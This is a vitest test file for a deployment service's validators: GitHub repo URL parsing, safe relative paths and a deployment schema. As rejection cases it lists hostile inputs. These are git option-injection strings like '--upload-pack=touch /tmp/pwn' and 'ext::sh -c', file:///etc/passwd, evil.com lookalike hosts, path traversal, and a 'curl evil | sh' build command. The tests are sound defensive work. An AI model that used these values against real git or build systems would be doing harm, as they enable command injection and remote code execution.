import { describe, expect, it } from "vitest";
import { createDeploymentSchema, isSafeRelativePath, parseRepoUrl } from "../src/lib/validation";

describe("parseRepoUrl", () => {
  it("accepts plain, .git and trailing-slash GitHub URLs", () => {
    expect(parseRepoUrl("https://github.com/vercel/next.js")?.url).toBe("https://github.com/vercel/next.js");
    expect(parseRepoUrl("https://github.com/a/b.git")?.url).toBe("https://github.com/a/b");
    expect(parseRepoUrl("https://github.com/a/b/")?.url).toBe("https://github.com/a/b");
  });

  it.each([
    "http://github.com/a/b",
    "git@github.com:a/b.git",
    "ssh://git@github.com/a/b",
    "file:///etc/passwd",
    "ext::sh -c 'touch /tmp/pwn'",
    "--upload-pack=touch /tmp/pwn",
    "https://github.com.evil.com/a/b",
    "https://evil.com/github.com/a/b",
    "https://user:pw@github.com/a/b",
    "https://github.com:8443/a/b",
    "https://github.com/a",
    "https://github.com/a/b/c",
    "https://github.com/../b",
    "https://github.com/a/b?x=1",
    "https://github.com/a/b#frag",
    "",
    "not a url",
  ])("rejects %s", (input) => {
    expect(parseRepoUrl(input)).toBeNull();
  });
});

describe("isSafeRelativePath", () => {
  it("accepts normal relative paths", () => {
    expect(isSafeRelativePath("apps/web")).toBe(true);
    expect(isSafeRelativePath("dist")).toBe(true);
    expect(isSafeRelativePath("packages/site-1/out/")).toBe(true);
  });

  it.each(["/etc", "../x", "a/../b", "a/./b", "a\\b", "a b", "", "a//b"])("rejects %j", (p) => {
    expect(isSafeRelativePath(p)).toBe(false);
  });
});

describe("createDeploymentSchema", () => {
  it("normalises the repo URL and treats empty optionals as absent", () => {
    const out = createDeploymentSchema.parse({
      repoUrl: " https://github.com/a/b.git ",
      branch: "",
      rootDir: "",
      outputDir: "",
    });
    expect(out).toEqual({ repoUrl: "https://github.com/a/b" });
  });

  it("accepts valid optional fields", () => {
    const out = createDeploymentSchema.parse({
      repoUrl: "https://github.com/a/b",
      branch: "feature/x-1",
      rootDir: "apps/web",
      outputDir: "dist",
    });
    expect(out.branch).toBe("feature/x-1");
    expect(out.rootDir).toBe("apps/web");
    expect(out.outputDir).toBe("dist");
  });

  it("rejects option-like branches, traversal and unknown keys", () => {
    const base = { repoUrl: "https://github.com/a/b" };
    expect(() => createDeploymentSchema.parse({ ...base, branch: "--upload-pack=x" })).toThrow();
    expect(() => createDeploymentSchema.parse({ ...base, branch: "a..b" })).toThrow();
    expect(() => createDeploymentSchema.parse({ ...base, rootDir: "../../etc" })).toThrow();
    expect(() => createDeploymentSchema.parse({ ...base, buildCommand: "curl evil | sh" })).toThrow();
    expect(() => createDeploymentSchema.parse({ repoUrl: "https://evil.com/a/b" })).toThrow();
  });
});
